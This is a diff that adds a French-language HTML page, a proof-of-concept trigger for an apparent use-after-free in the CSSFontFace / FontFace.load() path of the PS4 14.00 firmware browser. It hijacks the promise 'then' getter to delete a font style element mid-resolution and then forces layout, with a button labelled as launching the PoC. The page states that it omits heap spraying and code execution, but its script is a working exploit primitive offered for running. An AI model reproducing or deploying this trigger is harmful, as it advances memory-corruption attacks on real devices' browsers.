@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PS4 14.00 — CSSFontFace UAF probe</title>
+<style>
+  body{font:16px system-ui,sans-serif;background:#101318;color:#f2f4f8;margin:0;padding:20px}
+  main{max-width:720px;margin:auto}
+  h1{font-size:22px}
+  button{padding:13px 18px;border:0;border-radius:10px;background:#f0f2f5;color:#111;font-weight:700}
+  #log{white-space:pre-wrap;background:#202630;border-radius:10px;padding:14px;min-height:160px;margin-top:16px;font:13px monospace}
+  .warn{color:#ffcf70}
+</style>
+<style id="victim-style">
+@font-face{font-family:VictimFace;src:local("Arial");}
+#victim-text{font-family:VictimFace,sans-serif}
+</style>
+</head>
+<body>
+<main>
+<h1>CSSFontFace — UAF targeted probe</h1>
+<p>Test ciblé du chemin FontFace.load() / résolution de promesse. Il ne contient ni heap spray, ni lecture/écriture mémoire arbitraire, ni chaîne d'exécution de code.</p>
+<p class="warn">Le test peut bloquer ou faire planter le navigateur. Il ne modifie pas le firmware ni les fichiers de la console. Lance-le une seule fois.</p>
+<p id="victim-text">Texte utilisant la police CSS victime.</p>
+<button id="run">Lancer le PoC ciblé</button>
+<div id="log">Prêt. Firmware cible : PS4 14.00.</div>
+</main>
+<script>
+(function(){
+  const out=document.getElementById('log');
+  const button=document.getElementById('run');
+  let started=false;
+  function log(s){out.textContent += "\n"+new Date().toLocaleTimeString()+"  "+s;}
+  button.addEventListener('click',function(){
+    if(started)return;
+    started=true;
+    button.disabled=true;
+    log("START");
+    log("FontFace API: "+(typeof FontFace));
+    log("document.fonts: "+(!!document.fonts));
+    if(typeof FontFace!=="function"||!document.fonts){
+      log("STOP: API indisponible");
+      return;
+    }
+    try{
+      Object.defineProperty(FontFace.prototype,"then",{
+        configurable:true,
+        get:function(){
+          log("THEN_GETTER_ENTERED");
+          const victim=document.getElementById("victim-style");
+          if(victim){
+            victim.remove();
+            log("VICTIM_STYLE_REMOVED");
+          }else{
+            log("VICTIM_STYLE_ALREADY_REMOVED");
+          }
+          void document.body.offsetHeight;
+          log("FORCED_LAYOUT_RETURNED");
+          return undefined;
+        }
+      });
+      log("THEN_GETTER_INSTALLED");
+      const face=new FontFace("UAFTriggerFace",'local("Arial")');
+      document.fonts.add(face);
+      log("FONT_ADDED");
+      face.load().then(function(){
+        log("LOAD_PROMISE_RESOLVED");
+      },function(e){
+        log("LOAD_PROMISE_REJECTED: "+String(e));
+      });
+      log("LOAD_CALLED");
+    }catch(e){
+      log("JS_EXCEPTION: "+String(e));
+    }
+  });
+})();
+</script>
+</body>
+</html>
